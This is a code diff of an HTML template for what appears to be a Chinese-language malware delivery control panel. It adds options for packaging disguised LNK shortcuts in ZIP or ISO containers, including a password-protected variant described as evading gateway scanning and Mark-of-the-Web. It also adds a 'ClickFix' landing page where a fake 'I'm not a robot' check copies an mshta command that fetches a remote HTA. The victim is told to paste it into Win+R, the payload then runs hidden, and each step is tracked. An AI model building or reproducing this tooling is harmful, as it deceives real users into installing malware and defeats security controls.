@@ -137,7 +137,7 @@
         <form method="POST">
             <input type="hidden" name="save_lnk" value="1">
             <div class="field-row">
-                <div class="form-group" style="flex: 1 1 220px;">
+                <div class="form-group" style="flex: 1 1 200px;">
                     <label for="lnk_lure_ext">伪装后缀</label>
                     <select id="lnk_lure_ext" name="lnk_lure_ext">
                         {% for ext in lure_ext_choices %}
@@ -145,6 +145,20 @@
                         {% endfor %}
                     </select>
                     <span class="help">快捷方式命名为 <code>文件名.{{ config.lnk_lure_ext }}.lnk</code>，Windows 默认隐藏 <code>.lnk</code> 后缀。</span>
+                </div>
+                <div class="form-group" style="flex: 1 1 200px;">
+                    <label for="lnk_container">投递容器</label>
+                    <select id="lnk_container" name="lnk_container">
+                        {% for key, label, desc in container_choices %}
+                        <option value="{{ key }}" {% if config.lnk_container == key %}selected{% endif %}>{{ label }}</option>
+                        {% endfor %}
+                    </select>
+                    <span class="help">ZIP 兼容性最好；ISO 以光盘镜像投递；ISO + 密码 ZIP 额外规避网关扫描与 MOTW 传播。</span>
+                </div>
+                <div class="form-group" style="flex: 1 1 200px;">
+                    <label for="lnk_zip_password">ZIP 密码</label>
+                    <input id="lnk_zip_password" type="text" name="lnk_zip_password" value="{{ config.lnk_zip_password }}" placeholder="仅 ISO + 密码 ZIP 生效" autocomplete="off">
+                    <span class="help">留空则不加密；密码需通过其他渠道告知目标。</span>
                 </div>
             </div>
             <div class="form-group">
@@ -166,11 +180,49 @@
                 <svg class="icon icon-sm" aria-hidden="true"><use href="#i-eye"></use></svg>
                 <span>预览</span>
                 <code>{{ preview }}.{{ config.lnk_lure_ext }}.lnk</code>
-                <span class="muted">→ ZIP：{{ lnk_preview }}</span>
+                <span class="muted">→ {{ lnk_preview }}{% if lnk_preview_inner %}（内嵌 {{ lnk_preview_inner }}{% if config.lnk_zip_password %}，AES 加密{% endif %}）{% endif %}</span>
             </div>
-            <p class="help">压缩包内仅显示该快捷方式，目标 EXE 与脚本放在隐藏目录。默认由 <code>ftp.exe -s:...</code> 启动载荷；启用 conhost 后改为 <code>conhost.exe --headless</code> 无窗口读取命令文件。</p>
+            <p class="help">压缩包内仅显示该快捷方式，目标 EXE 与脚本放在隐藏目录。默认由 <code>ftp.exe -s:...</code> 启动载荷；启用 conhost 后改为 <code>conhost.exe --headless</code> 无窗口读取命令文件。ISO 不保留 DOS 隐藏属性，建议配合 <code>__MACOSX</code> 伪装。</p>
             <div class="form-actions">
                 <button type="submit" class="btn btn-primary">保存 LNK 设置</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<div class="card">
+    <div class="card-head">
+        <div>
+            <div class="card-title">
+                <svg class="icon" aria-hidden="true"><use href="#i-globe"></use></svg>
+                ClickFix 落地页
+                {% if config.landing_enabled %}
+                <span class="badge badge-success"><span class="dot"></span>已启用</span>
+                {% else %}
+                <span class="badge badge-muted"><span class="dot"></span>未启用</span>
+                {% endif %}
+            </div>
+            <div class="card-sub">用「人机验证」诱导目标复制并执行 mshta 命令，无需投递附件。</div>
+        </div>
+    </div>
+    <div class="card-body">
+        <form method="POST">
+            <input type="hidden" name="save_landing" value="1">
+            <label class="switch">
+                <input type="checkbox" name="landing_enabled" {% if config.landing_enabled %}checked{% endif %}>
+                <span class="switch-text">
+                    <strong>启用 ClickFix 落地页</strong>
+                    <span>在回传端口开放 <code>/p/&lt;token&gt;</code> 页面；关闭后访问返回 404。</span>
+                </span>
+            </label>
+            <div class="preview-box">
+                <svg class="icon icon-sm" aria-hidden="true"><use href="#i-external"></use></svg>
+                <span>访问地址</span>
+                <code>{{ landing_preview }}</code>
+            </div>
+            <p class="help">目标点击「我不是机器人」后，页面会把 <code>mshta "http://…/p/&lt;token&gt;/run.hta"</code> 复制到剪贴板，并按提示在 <kbd>Win</kbd>+<kbd>R</kbd> 中粘贴执行；HTA 随后下载并隐藏运行载荷。系统会记录访问、复制、HTA 打开与载荷运行事件。</p>
+            <div class="form-actions">
+                <button type="submit" class="btn btn-primary">保存落地页设置</button>
             </div>
         </form>
     </div>
